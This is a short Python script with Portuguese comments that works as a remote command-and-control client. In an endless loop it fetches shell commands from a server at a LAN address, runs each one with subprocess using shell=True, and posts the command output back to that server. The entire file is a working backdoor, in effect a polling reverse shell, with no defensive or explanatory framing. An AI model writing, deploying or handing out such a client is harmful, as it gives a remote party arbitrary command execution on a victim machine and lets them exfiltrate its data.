
import requests
import subprocess
import time

SERVER_URL = "http://192.168.0.19:8080/command"

def run_client():
    while True:
        try:
            # 1. Obter comando do servidor
            response = requests.get(SERVER_URL)
            cmd = response.text.strip()  # Remove espaços e quebras de linha
            
            print(f"[+] Comando recebido: {cmd}")  # Debug
            
            if cmd.lower() == "exit":
                print("[!] Encerrando cliente...")
                break
                
            # 2. Executar comando
            result = subprocess.run(cmd, 
                                  shell=True, 
                                  capture_output=True, 
                                  text=True,  # Converte saída para string
                                  timeout=10)
            
            # 3. Preparar resposta
            output = f"STDOUT:\n{result.stdout}\nSTDERR:\n{result.stderr}"
            
            # 4. Enviar resposta
            requests.post(SERVER_URL, data=output)
            print("[+] Resposta enviada")  # Debug
            
        except requests.ConnectionError:
            print("[!] Erro de conexão - Servidor offline?")
            time.sleep(5)
        except subprocess.TimeoutExpired:
            error = "Erro: Comando excedeu tempo limite"
            requests.post(SERVER_URL, data=error)
        except Exception as e:
            print(f"[!] Erro inesperado: {str(e)}")
            time.sleep(5)

if __name__ == "__main__":
    run_client()
